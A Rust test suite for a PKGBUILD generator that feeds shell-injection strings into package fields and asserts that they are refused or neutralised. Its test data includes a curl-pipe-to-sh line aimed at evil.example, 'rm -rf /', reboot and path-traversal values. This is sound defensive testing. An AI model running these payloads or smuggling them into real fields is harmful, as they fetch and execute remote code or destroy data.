//! Generated PKGBUILDs are shell that makepkg sources. These cases try to make
//! one of the interpolated fields close its quote and run something, and assert
//! that bash both accepts the file and executes nothing from it.

use archbridge::recipe::{generate_pkgbuild, BuildSystem, PkgbuildParams};
use std::io::Write;
use std::path::Path;
use std::process::Command;

const DIGEST: &str = "b";

fn params_with(
    name: &str,
    version: &str,
    dependencies: Vec<String>,
    source: &str,
    sha: &str,
    entry: Option<&str>,
    subdir: Option<&str>,
) -> PkgbuildParams {
    PkgbuildParams {
        name: name.to_string(),
        version: version.to_string(),
        source_tarball: source.to_string(),
        sha256_hash: sha.to_string(),
        dependencies,
        entry_binary: entry.map(str::to_string),
        src_subdir: subdir.map(str::to_string),
        // The payloads these fixtures stand for are x86_64 machines'.
        architecture: Some("amd64".to_string()),
    }
}

fn valid() -> PkgbuildParams {
    params_with(
        "demo-tool",
        "1.0.0",
        vec!["glibc".to_string()],
        "src.tar.gz",
        &DIGEST.repeat(64),
        Some("demo-tool"),
        None,
    )
}

fn bash_available() -> bool {
    Command::new("bash").arg("--version").output().is_ok()
}

fn makefile_available() -> bool {
    Command::new("bash")
        .arg("-c")
        .arg("command -v mktemp grep")
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false)
}

/// Write the script and ask bash to parse it. Returns stderr when it refuses.
fn bash_accepts(script: &str, dir: &Path, label: &str) -> Result<(), String> {
    let path = dir.join(format!("{label}.PKGBUILD"));
    let mut file = std::fs::File::create(&path).expect("create");
    file.write_all(script.as_bytes()).expect("write");
    drop(file);
    let check = Command::new("bash")
        .arg("-n")
        .arg(&path)
        .output()
        .expect("run bash");
    if check.status.success() {
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&check.stderr).to_string())
    }
}

#[test]
fn a_dependency_cannot_close_its_quote() {
    for hostile in [
        "glibc'); touch /tmp/archbridge-pwned; #",
        "openssl' ; reboot ; '",
        "$(curl evil.example | sh)",
        "`id`",
        "foo;bar",
        "foo|bar",
        "foo&&bar",
        "foo\u{8}bar",
        "foo\nbar",
        "foo\0bar",
        "'; fi; echo",
        "\\",
        "'",
        "\"",
        " ",
        "",
        "tool/../etc/passwd",
        "/bin/sh",
        "dep=../../x",
        "dep>=",
        "ünicode",
    ] {
        let error = generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                "demo",
                "1.0.0",
                vec![hostile.to_string()],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some("demo"),
                None,
            ),
        )
        .err_or_panic(format!("dependency {hostile:?} was accepted"));
        assert!(
            error.contains("Dependency") || error.contains("dependency"),
            "unhelpful message for {hostile:?}: {error}"
        );
    }
}

#[test]
fn ordinary_dependencies_and_pacman_constraints_pass_through() {
    let accepted = [
        "glibc",
        "openssl-1.0",
        "lib32-gcc-libs",
        "pkg@name",
        "sun-java=1.0",
        "tool>=1.2.3",
        "tool<=1.2.3",
        "tool>1",
        "tool<1",
        "a+b.c_d-e",
    ];
    for dep in accepted {
        let script = generate_pkgbuild(
            &BuildSystem::Make,
            &params_with(
                "demo",
                "1.0.0",
                vec![dep.to_string()],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some("demo"),
                None,
            ),
        )
        .unwrap_or_else(|e| panic!("dependency '{dep}' rejected: {e}"));
        assert!(
            script.contains(&format!("depends=('{dep}')")),
            "dependency '{dep}' was rewritten: {script}"
        );
    }
}

/// A DEB control file writes `libc6 (>= 2.17)`; pacman writes the same fact as
/// `libc6>=2.17`. Converting is what lets an inspected package contribute real
/// dependencies instead of a rejected string.
#[test]
fn deb_style_constraints_are_converted() {
    for (raw, expected) in [
        ("libc6 (>= 2.17)", "libc6>=2.17"),
        ("zlib1g (<= 1:1.2.11)", "zlib1g<=1:1.2.11"),
        ("foo (= 1.0)", "foo=1.0"),
        ("bar (> 2)", "bar>2"),
        ("baz (< 9)", "baz<9"),
    ] {
        let script = generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                "demo",
                "1.0.0",
                vec![raw.to_string()],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some("demo"),
                None,
            ),
        )
        .unwrap_or_else(|e| panic!("'{raw}' rejected: {e}"));
        assert!(
            script.contains(&format!("depends=('{expected}')")),
            "'{raw}' produced: {script}"
        );
    }

    // A constraint nobody can express is refused with the original text shown.
    for raw in ["libc6 (>= )", "weird (nonsense)", "a (b) (c)"] {
        let error = generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                "demo",
                "1.0.0",
                vec![raw.to_string()],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some("demo"),
                None,
            ),
        )
        .err_or_panic(format!("'{raw}' was accepted"));
        assert!(
            error.contains(raw) || error.contains("Dependency"),
            "{error}"
        );
    }
}

#[test]
fn the_source_name_digest_and_subdirectory_are_checked() {
    let good_sha = DIGEST.repeat(64);

    for source in [
        "",
        "../src.tar.gz",
        "/etc/src.tar.gz",
        "src.tar.gz'; rm -rf / #",
        "src\n.tar.gz",
        "a\tb",
        &"a".repeat(300),
    ] {
        let error = generate_pkgbuild(
            &BuildSystem::Make,
            &params_with(
                "demo",
                "1.0.0",
                vec![],
                source,
                &good_sha,
                Some("demo"),
                None,
            ),
        )
        .err_or_panic(format!("source '{source}' was accepted"));
        assert!(error.contains("Source archive"), "{source}: {error}");
    }

    for sha in [
        "",
        "deadbeef",
        &"z".repeat(64),
        &DIGEST.repeat(63),
        &"b".repeat(65),
    ] {
        let error = generate_pkgbuild(
            &BuildSystem::Make,
            &params_with(
                "demo",
                "1.0.0",
                vec![],
                "src.tar.gz",
                sha,
                Some("demo"),
                None,
            ),
        )
        .err_or_panic(format!("digest '{sha}' was accepted"));
        assert!(error.contains("Checksum"), "{sha}: {error}");
    }
    // SKIP is the one non-digest makepkg accepts.
    let script = generate_pkgbuild(
        &BuildSystem::Make,
        &params_with(
            "demo",
            "1.0.0",
            vec![],
            "src.tar.gz",
            "SKIP",
            Some("demo"),
            None,
        ),
    )
    .expect("SKIP is a documented value");
    assert!(script.contains("sha256sums=('SKIP')"), "{script}");

    for subdir in [
        "..",
        "a/../../b",
        "/abs",
        "",
        "weird;ls",
        "sub\u{ff}dir",
        "a//b",
    ] {
        let error = generate_pkgbuild(
            &BuildSystem::Make,
            &params_with(
                "demo",
                "1.0.0",
                vec![],
                "src.tar.gz",
                &good_sha,
                Some("demo"),
                Some(subdir),
            ),
        )
        .err_or_panic(format!("subdir {subdir:?} was accepted"));
        assert!(
            error.contains("Source subdirectory") || error.contains("subdirectory"),
            "{subdir:?}: {error}"
        );
    }
    let script = generate_pkgbuild(
        &BuildSystem::Make,
        &params_with(
            "demo",
            "1.0.0",
            vec![],
            "src.tar.gz",
            &good_sha,
            Some("demo"),
            Some("nested/dir-1.0"),
        ),
    )
    .expect("a plain nested path is usable");
    assert!(script.contains("cd \"$srcdir/nested/dir-1.0\""), "{script}");
}

#[test]
fn an_unusable_entry_name_is_refused_not_escaped() {
    for entry in [
        "", "-flag", "a;rm", "a b", "a\tb", "a'b", "a$b", "a`b", "../bin", "ünicode",
    ] {
        let error = generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                "demo",
                "1.0.0",
                vec![],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some(entry),
                None,
            ),
        )
        .err_or_panic(format!("entry '{entry}' was accepted"));
        assert!(error.contains("Entry binary"), "{entry}: {error}");
    }

    // sanitize_entry_name rewrites to a character set the generator must accept,
    // or every inferred entry would be a plan failure.
    for raw in ["a b", "a;rm", "python@3", "..weird", "ünicode"] {
        let cleaned = archbridge::recipe::sanitize_entry_name(raw);
        generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                "demo",
                "1.0.0",
                vec![],
                "src.tar.gz",
                &DIGEST.repeat(64),
                Some(&cleaned),
                None,
            ),
        )
        .unwrap_or_else(|e| panic!("sanitize_entry_name('{raw}') = '{cleaned}' rejected: {e}"));
    }
}

/// The names a build derives from a directory or archive are hostile input: a
/// package name is written into `pkgname` and a few other places, so every
/// rewrite has to land inside what makepkg and bash both accept.
#[test]
fn weird_names_and_versions_stay_inert() {
    let cases = [
        ("", "1.0.0"),
        ("-leading", "1:0.3.4-1"),
        ("...dots...", "0.1~rc1"),
        ("A B; rm -rf /", "1.0-2.el8"),
        ("é", "ünicode"),
        ("a'b\"c$(x)`y;", "99999999999999999999999999999:1.0"),
        (&"n".repeat(400), &"v".repeat(400)),
        ("@weird@name@", "1.0.0-alpha+beta"),
    ];

    let dir = tempfile::tempdir().expect("tempdir");
    for (name, version) in cases {
        let script = generate_pkgbuild(
            &BuildSystem::Cargo,
            &params_with(
                name,
                version,
                vec![],
                "src.tar.gz",
                &DIGEST.repeat(64),
                None,
                None,
            ),
        )
        .unwrap_or_else(|e| panic!("name {name:?} version {version:?}: {e}"));

        let pkgname = script
            .lines()
            .find(|line| line.starts_with("pkgname="))
            .expect("pkgname line");
        assert!(
            !pkgname.contains('\'',) || pkgname.matches('\'').count() == 2,
            "quoted twice at most: {pkgname}"
        );
        for token in [";", "`", "$(", "(", ")", "|", "&", "\n", "\\"] {
            assert!(
                !pkgname.contains(token),
                "{name:?} produced a live shell token: {pkgname}"
            );
        }
        let pkgver = script
            .lines()
            .find(|line| line.starts_with("pkgver="))
            .expect("pkgver line");
        assert!(
            pkgver.contains(&format!("pkgver='{}'", {
                let (_, rest) = split_epoch(version);
                sanitize_version_chars(rest)
            })),
            "version {version:?} became {pkgver}"
        );

        if bash_available() {
            bash_accepts(&script, dir.path(), &format!("inert-{}", pkgname.len()))
                .unwrap_or_else(|stderr| panic!("{name:?}/{version:?} invalid shell:\n{stderr}"));
        }
    }
}

fn split_epoch(version: &str) -> (Option<u64>, &str) {
    match version.split_once(':') {
        Some((prefix, rest))
            if !prefix.is_empty() && prefix.bytes().all(|b| b.is_ascii_digit()) =>
        {
            (prefix.parse().ok(), rest)
        }
        _ => (None, version),
    }
}

fn sanitize_version_chars(raw: &str) -> String {
    let mut out: String = raw
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '@' | '_') {
                c
            } else {
                '_'
            }
        })
        .collect();
    while out.starts_with(|c: char| !c.is_ascii_alphanumeric()) {
        out.remove(0);
    }
    if out.is_empty() {
        out = "1.0.0".to_string();
    }
    out
}

/// Sourcing a PKGBUILD runs its top level. Nothing in a generated file may
/// create a file, so the marker is the assertion.
#[test]
fn sourcing_a_generated_pkgbuild_runs_nothing() {
    if !bash_available() {
        eprintln!("bash is unavailable; skipping");
        return;
    }
    let dir = tempfile::tempdir().expect("tempdir");
    let marker = dir.path().join("pwned");

    for system in [
        BuildSystem::Imported,
        BuildSystem::Cmake,
        BuildSystem::Make,
        BuildSystem::Cargo,
        BuildSystem::Go,
        BuildSystem::Npm,
        BuildSystem::Yarn,
        BuildSystem::Meson,
    ] {
        let script = generate_pkgbuild(&system, &valid()).expect("valid params");
        let path = dir.path().join(format!("{system:?}.PKGBUILD"));
        std::fs::write(&path, &script).expect("write");

        let run = Command::new("bash")
            .arg("-c")
            .arg(format!(
                "srcdir='{}'; pkgdir='{}'; source '{}'",
                dir.path().display(),
                dir.path().display(),
                path.display()
            ))
            .output()
            .expect("run bash");
        assert!(
            run.status.success(),
            "{system:?} failed to source:\n{}\n{}",
            script,
            String::from_utf8_lossy(&run.stderr)
        );
        assert!(
            !marker.exists(),
            "{system:?} executed something at source time"
        );
    }
}

#[test]
fn the_imported_payload_extract_uses_the_validated_name() {
    let script = generate_pkgbuild(
        &BuildSystem::Imported,
        &params_with(
            "demo",
            "1.0",
            vec![],
            "payload.tar.xz",
            &DIGEST.repeat(64),
            None,
            None,
        ),
    )
    .expect("imported");
    assert!(
        script.contains("bsdtar -xf \"$srcdir/payload.tar.xz\" -C \"$pkgdir\""),
        "{script}"
    );

    let gz = generate_pkgbuild(
        &BuildSystem::Imported,
        &params_with(
            "demo",
            "1.0",
            vec![],
            "src.tar.gz",
            &DIGEST.repeat(64),
            None,
            None,
        ),
    )
    .expect("imported gz");
    assert!(
        gz.contains("tar -xzf \"$srcdir/src.tar.gz\" -C \"$pkgdir\""),
        "{gz}"
    );
    if bash_available() {
        let dir = tempfile::tempdir().expect("tempdir");
        bash_accepts(&gz, dir.path(), "imported-gz").expect("bash -n");
    }
}

/// Epoch survives the rewrite instead of becoming part of pkgver, which is how
/// version ordering keeps working for converted foreign packages.
#[test]
fn epochs_are_split_out_of_the_version() {
    let script = generate_pkgbuild(
        &BuildSystem::Cargo,
        &params_with(
            "demo",
            "2:1.2.3-4",
            vec![],
            "src.tar.gz",
            &DIGEST.repeat(64),
            Some("demo"),
            None,
        ),
    )
    .expect("valid");
    assert!(script.contains("pkgver='1.2.3_4'"), "{script}");
    assert!(script.contains("epoch=2\n"), "{script}");

    let no_epoch = generate_pkgbuild(
        &BuildSystem::Cargo,
        &params_with(
            "demo",
            "notanepoch:1.0",
            vec![],
            "src.tar.gz",
            &DIGEST.repeat(64),
            Some("demo"),
            None,
        ),
    )
    .expect("valid");
    assert!(
        !no_epoch.contains("epoch="),
        "a non-numeric epoch is not an epoch: {no_epoch}"
    );
    assert!(no_epoch.contains("pkgver='notanepoch_1.0'"), "{no_epoch}");
}

/// Deterministic sweep: every combination of hostile field values either
/// produces a file bash can parse, or an error that names the field.
#[test]
fn fuzz_pkgbuild_fields_never_produce_live_shell() {
    let names = [
        "tool",
        "",
        " ",
        "a'b",
        "a$b",
        "a`b",
        "-x",
        "..",
        "é",
        &"n".repeat(200),
    ];
    let versions = [
        "",
        "1.0",
        "1:2.3-4",
        "0.1~rc1",
        "$(x)",
        "a'b",
        "1.0\n2.0",
        &"9".repeat(80),
    ];
    let deps = [
        "glibc",
        "libc6 (>= 2.17)",
        "a'; touch /tmp/x; #",
        "",
        "a b",
        "/bin/sh",
        "tool>=1.0",
    ];
    let sources = ["src.tar.gz", "payload.tar.xz", "../x", "a b", "a'b", ""];
    let entries = [Some("tool"), Some("a b"), Some("a'b"), Some("-x"), None];
    let subdirs = [
        None,
        Some("tool-1.0"),
        Some("a/../b"),
        Some("a b"),
        Some(""),
    ];

    let dir = tempfile::tempdir().expect("tempdir");
    let mut produced = 0usize;
    let mut rejected = 0usize;
    for name in names {
        for version in &versions {
            for dep in &deps {
                for source in &sources {
                    for entry in &entries {
                        let outcome = generate_pkgbuild(
                            &BuildSystem::Cargo,
                            &params_with(
                                name,
                                version,
                                vec![dep.to_string()],
                                source,
                                &DIGEST.repeat(64),
                                *entry,
                                None,
                            ),
                        );
                        match outcome {
                            Ok(script) => {
                                produced += 1;
                                assert_generated_is_inert(&script, dep, source, entry);
                            }
                            Err(_) => rejected += 1,
                        }
                    }
                }
            }
        }
    }
    for name in names {
        for subdir in &subdirs {
            let outcome = generate_pkgbuild(
                &BuildSystem::Make,
                &params_with(
                    name,
                    "1.0",
                    vec![],
                    "src.tar.gz",
                    &DIGEST.repeat(64),
                    Some("tool"),
                    *subdir,
                ),
            );
            match outcome {
                Ok(script) => {
                    produced += 1;
                    if let Some(subdir) = subdir {
                        assert!(!subdir.contains(".."), "traversal survived into the script");
                    }
                    assert_generated_is_inert(&script, "glibc", "src.tar.gz", &Some("tool"));
                }
                Err(_) => rejected += 1,
            }
        }
    }
    assert!(produced > 0, "nothing was ever accepted");
    assert!(rejected > 0, "nothing was ever refused");

    if bash_available() && makefile_available() {
        // And every accepted shape still parses as shell.
        let script = generate_pkgbuild(&BuildSystem::Make, &valid()).expect("valid");
        bash_accepts(&script, dir.path(), "fuzz-final").expect("bash -n");
    }
}

/// A generated file may contain the values it was given, but never a token that
/// bash would read as syntax outside a quoted array element.
fn assert_generated_is_inert(script: &str, dep: &str, source: &str, entry: &Option<&str>) {
    // Backslashes, backticks and `$(` have no legitimate place in any value this
    // generator writes, so their absence is proof nothing hostile survived.
    for token in ["`", "$("] {
        assert!(
            !script.contains(token),
            "{token} reached a generated PKGBUILD (dep {dep:?} source {source:?}): {script}"
        );
    }

    let lines: Vec<&str> = script.lines().collect();
    for line in &lines {
        if let Some(value) = line
            .strip_prefix("depends=")
            .unwrap_or_default()
            .strip_prefix('(')
        {
            for element in value.trim_end_matches(')').split(' ') {
                if element.is_empty() {
                    continue;
                }
                assert!(
                    element.starts_with('\'') && element.ends_with('\''),
                    "an unquoted dependency element {element:?} in {line}"
                );
                assert_eq!(
                    element.matches('\'').count(),
                    2,
                    "a quote inside a dependency element: {line}"
                );
            }
        }
    }
    if let Some(entry) = entry {
        assert!(
            !entry.contains('\''),
            "the entry {entry:?} should have been refused"
        );
    }
    assert!(
        lines.iter().any(|line| line.starts_with("pkgname=")),
        "no pkgname: {script}"
    );
    assert!(
        lines.iter().any(|line| line.starts_with("sha256sums=(")),
        "no checksums: {script}"
    );
}

trait ErrOrPanic {
    fn err_or_panic(self, message: String) -> String;
}

impl<T> ErrOrPanic for Result<T, String> {
    fn err_or_panic(self, message: String) -> String {
        match self {
            Err(error) => error,
            Ok(_) => panic!("{message}"),
        }
    }
}
